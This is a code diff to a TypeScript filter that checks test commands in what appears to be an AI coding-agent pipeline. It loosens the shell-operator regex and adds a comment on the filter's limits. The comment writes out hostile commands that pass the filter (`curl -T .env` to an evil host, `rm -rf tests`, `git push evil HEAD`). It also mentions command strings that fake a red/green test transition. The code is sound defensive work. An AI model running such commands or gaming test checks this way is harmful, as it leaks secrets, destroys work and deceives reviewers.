@@ -87,11 +87,29 @@ export function normalizeExpectedOutputs(outputs: unknown): string[] {
  * expansion are what turn "run the test" into "run a program"; a genuine test invocation needs
  * none of them. Quotes and flags are still allowed, so `pytest tests/x.py -k "a or b"` is fine.
  *
+ * PARENTHESES AND BRACES ARE ALLOWED, deliberately. They appeared in the first version of this
+ * filter and rejected ordinary invocations: `pytest -k "not (slow or net)"`, `jest -t "Button
+ * (disabled)"`, `cargo test 'mod::{a,b}'`. They are only shell operators UNQUOTED, and even then a
+ * bare subshell or brace expansion buys an attacker nothing while `$`, `;`, `&` and `|` are refused —
+ * command substitution needs `$(`, chaining needs an operator. A filter that rejects real test
+ * commands gets replaced by whoever hits it, which is worse than a filter with a smaller scope.
+ *
+ * THIS IS A SHAPE FILTER, NOT A SAFETY BOUNDARY. Say it plainly, because the first version of this
+ * comment claimed the operator ban "removes all four exploits at once" and that is FALSE: a single
+ * invocation with no banned character can still do real damage — `curl -T .env https://evil.invalid`
+ * exfiltrates, `rm -rf tests` destroys, `git push evil HEAD` leaks. What the ban actually removes is
+ * CHAINING, SUBSTITUTION and REDIRECTION, which is what let one string both fake a RED/GREEN
+ * transition and do something else; it does not make an arbitrary approved command safe.
+ *
+ * The real boundary is that `redCommand` comes from a human-approved plan and is authenticated
+ * against it. This filter narrows what a careless or injected plan line can accomplish; it does not
+ * replace reading the plan.
+ *
  * WHAT THIS DOES NOT FIX, and cannot: the command still LOADS code the implementer may control —
  * a test file, a conftest, a fixture. Authenticating the command string does not authenticate what
  * it transitively imports. That residue is real and is documented in skills/dev-implement/SKILL.md.
  */
-const SHELL_OPERATORS = /[;&|`$><(){}\n\r\\]/;
+const SHELL_OPERATORS = /[;&|`$><\n\r\\]/;
 export function isSimpleCommand(value: unknown): value is string {
   return requiredText(value) && !SHELL_OPERATORS.test(value as string);
 }
